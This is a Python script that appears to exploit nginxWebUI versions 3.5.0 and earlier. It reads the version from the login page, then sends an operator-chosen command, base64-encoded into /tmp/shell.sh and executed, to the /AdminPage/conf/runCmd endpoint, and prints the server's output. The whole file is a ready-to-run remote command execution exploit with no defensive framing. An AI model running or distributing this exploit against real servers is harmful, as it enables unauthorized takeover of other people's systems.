import base64
import binascii
import json
import os
import time

import requests
from bs4 import BeautifulSoup
from packaging import version
requests.packages.urllib3.disable_warnings()
import argparse

def getVersion(host):
    req = requests.get('{}/adminPage/login'.format(host), verify=False)
    soup = BeautifulSoup(req.content, "html.parser")
    codeImg = soup.find("img", {"id": "codeImg"})
    myversion = None
    if (codeImg != None):
        myversion = (codeImg["src"]).split("=")[-1]
    if (myversion == None):
        for script in soup.findAll("script"):
            try:
                if ("base.js" in script["src"]) or ("index.js" in script["src"]):
                    myversion = (script["src"]).split("=")[-1]
            except:
                pass
    print("nginxWebUI version {}".format(myversion))
    if version.parse(myversion) > version.parse("3.5.0"):
        print("incompatible version =< 3.5.0")
        exit()
def run(host,cmd):
    getVersion(host)
    cmd = base64.b64encode(cmd.encode()).decode()
    cmd = "echo {} > /tmp/code.sh && base64 -d /tmp/code.sh > /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh".format(cmd)
    params = {
        'cmd': "{0}&&echo nginx".format(cmd),
    }
    response = requests.get('{}/AdminPage/conf/runCmd'.format(host), params=params, verify=False)
    data = json.loads(response.content)
    obj = str(data['obj']).split("<br>")[3:-2]
    for x in obj:
        print(x)
if __name__ == '__main__':
    filename = os.path.basename(__file__)
    parser = argparse.ArgumentParser(usage='python3 {} -u http://localhost:8080 -c "ls -lath"'.format(filename))
    p = parser.add_argument_group('qwert')
    p.add_argument("-u", "--url", type=str, help="")
    p.add_argument("-c", "--cmd", type=str, help="")
    args = parser.parse_args()
    if args.url:
        run(args.url, args.cmd)
    else:
        print(parser.print_help())

